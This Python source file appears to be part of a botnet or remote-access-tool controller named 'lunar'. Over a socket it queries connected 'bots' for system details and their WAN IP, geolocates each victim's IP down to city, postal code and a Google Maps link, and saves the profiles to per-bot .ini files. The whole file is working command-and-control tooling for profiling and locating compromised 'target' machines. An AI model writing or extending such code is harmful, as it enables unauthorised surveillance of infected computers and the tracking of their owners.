import geoip2.database
import configparser
import datetime
from colorama import Fore, Style

# from .lunar_main import clients

database_path = "GeoLite2-City.mmdb"
info = configparser.ConfigParser()
t_now = datetime.datetime.now()
global_info = configparser.ConfigParser()

web_bot_info = []

try:
    global_info.read("lunar.ini")
except FileNotFoundError:
    print("--> lunar Configuration file missing!")
    exit(1)


def w_bot_name_only(file):
    try:
        info.read("bots/" + file + ".ini")
        main = info['INFORMATION']
        user_pc = main['User-PC']
        return user_pc
    except Exception as e:
        return "Error : " + str(e)


def bot_name_only(file):
    try:
        info.read(file + ".ini")
        main = info['INFORMATION']
        user_pc = main['User-PC']
        return user_pc
    except Exception as e:
        return str(e)


def bot_os_only(file):
    try:
        info.read(file + ".ini")
        main = info['INFORMATION']
        os = main['OS']
        return os
    except Exception as e:
        return str(e)


def read_info(file):
    try:
        info.read(file + ".ini")
        main = info['INFORMATION']
        os = main['OS']
        ram = main['RAM']
        v_ram = main['VirtualRam']
        min_app = main['MinimumApplicationAddress']
        max_app = main['MaximumApplicationAddress']
        page_sz = main['PageSize']
        proc_s = main['Processors']
        agent = main['Agent-Location']
        user_pc = main['User-PC']
        wan_ip = main['WAN']
        iso_code = main['ISOCODE']
        country = main['country']
        p_code = main['PostalCode']
        region = main['Region']
        city = main['City']
        location = main['Location']
        cn_time = main['Connected-at']

        del web_bot_info[:]
        web_bot_info.append("\nOS                : " + str(os))
        web_bot_info.append("\nRam               : " + str(ram))
        web_bot_info.append("\nVirtual Ram       : " + str(v_ram))
        web_bot_info.append("\nMin App Address   : " + str(min_app))
        web_bot_info.append("\nMax App Address   : " + str(max_app))
        web_bot_info.append("\nProcessors        : " + str(proc_s))
        web_bot_info.append("\nPage size         : " + str(page_sz))
        web_bot_info.append("\nAgent-Location    : " + str(agent))
        web_bot_info.append("\nUser-PC           : " + str(user_pc))
        web_bot_info.append("\nWAN               : " + str(wan_ip))
        web_bot_info.append("\nISO Code          : " + str(iso_code))
        web_bot_info.append("\nCountry           : " + str(country))
        web_bot_info.append("\nPostal Code       : " + str(p_code))
        web_bot_info.append("\nRegion            : " + str(region))
        web_bot_info.append("\nCity              : " + str(city))
        web_bot_info.append("\nLocation          : " + str(location))
        web_bot_info.append("\nConnected at      : " + str(cn_time))
        print("\nReading : '" + file + "' Information\n_____________________\n")
        print("OS                : " + str(os))
        print("Ram               : " + str(ram))
        print("Virtual Ram       : " + str(v_ram))
        print("Min App Address   : " + str(min_app))
        print("Max App Address   : " + str(max_app))
        print("Processors        : " + str(proc_s))
        print("Page size         : " + str(page_sz))
        print("Agent-Location    : " + str(agent))
        print("User-PC           : " + str(user_pc))
        print("WAN               : " + str(wan_ip))
        print("ISO Code          : " + str(iso_code))
        print("Country           : " + str(country))
        print("Postal Code       : " + str(p_code))
        print("Region            : " + str(region))
        print("City              : " + str(city))
        print("Location          : " + str(location))
        print("Connected at      : " + str(cn_time))

    except Exception as e_read:
        print("Error Reading Information file. ( " + str(e_read) + " )")


def save_info(client_socket, filename):
    filename = filename + ".ini"
    bot_settings = global_info['bot']

    def send_data(data):
        try:
            client_socket.send(data.encode())
        except Exception as s_error:
            print("[ERROR] " + str(s_error))

    def send_bytes(data):
        # data = data.encode()
        try:
            client_socket.send(data)
        except Exception as s_error:
            print("[ERROR] " + str(s_error))

    def write_to_file():
        with open(filename, "w+") as info_file:
            info['INFORMATION'] = {
                'OS': str(os),
                'Ram': str(ram) + " mb",
                'VirtualRam': str(v_ram) + " mb",
                'MinimumApplicationAddress': str(min_app_addr),
                'MaximumApplicationAddress': str(max_app_addr),
                'PageSize': str(pagesize),
                'Processors': str(processors),
                'Agent-Location': str(agent_location),
                'User-PC': str(user_pc),
                'WAN': str(wan_ip),
                'ISOCODE': str(iso_code),
                'Country': str(country),
                'PostalCode': str(postal_code),
                'Region': str(region),
                'City': str(city),
                'Location': str(location),
                'Connected-at': str(t_now),
            }

            info.write(info_file)

    database = geoip2.database.Reader(database_path)
    try:
        send_data("wanip")
        wan_ip = client_socket.recv(1024).decode()
        send_data("os")
        os = client_socket.recv(1024).decode()
        send_data("ramsize")
        ram = client_socket.recv(1024).decode()
        send_data("vramsize")
        v_ram = client_socket.recv(1024).decode()
        send_data("pagesize")
        pagesize = client_socket.recv(1024).decode()
        send_data("processors")
        processors = client_socket.recv(1024).decode()
        send_data("minappaddr")
        min_app_addr = client_socket.recv(1024).decode()
        send_data("maxappaddr")
        max_app_addr = client_socket.recv(1024).decode()
        send_data("agent")
        agent_location = client_socket.recv(1024).decode()
        send_data("userpc")
        user_pc = client_socket.recv(1024).decode()

        if wan_ip.startswith("No"):
            print(
                "[" + Style.BRIGHT +
                Fore.LIGHTGREEN_EX +
                "+" + Style.RESET_ALL +
                "] Bot was unable to get Wan IP because Target PC does not have an active Internet connection.")
            ip_info = "Failed to get"
            iso_code = "Failed to get"
            country = "Failed to get"
            postal_code = "Failed to get"
            region = "Failed to get"
            city = "Failed to get"
            location = "Failed to get"
        else:
            ip_info = database.city(wan_ip)
            iso_code = ip_info.country.iso_code
            country = ip_info.country.name
            postal_code = ip_info.postal.code
            region = ip_info.subdivisions.most_specific.name
            city = ip_info.city.name
            location = "https://www.google.com/maps?q=" + str(ip_info.location.latitude) + "," + str(
                ip_info.location.longitude)

        if bot_settings['auto_print_bot_info'] is True:
            print("Ram               : " + str(ram))
            print("Virtual Ram       : " + str(v_ram))
            print("Min App Address   : " + str(min_app_addr))
            print("Max App Address   : " + str(max_app_addr))
            print("Processors        : " + str(processors))
            print("Page size         : " + str(pagesize))
            print("Agent-Location    : " + str(agent_location))
            print("User-PC           : " + str(user_pc))
            print("WAN               : " + str(wan_ip))
            print("ISO Code          : " + str(iso_code))
            print("Country           : " + str(country))
            print("Postal Code       : " + str(postal_code))
            print("Region            : " + str(region))
            print("City              : " + str(city))
            print("Location          : " + str(location))
            print("Connected at      : " + str(t_now))
            print("(All this information is saved under " + filename + ")")

        try:
            file = open(filename, "r")
            print("[" + Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Updating Existing Information.")
            file.close()
            write_to_file()
        except FileNotFoundError:
            print("[" + Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Saving Information.")
            write_to_file()

    except Exception as e:
        print("Somethings wrong.... Failed to get Information..")
        print("Error : " + str(e))
        pass
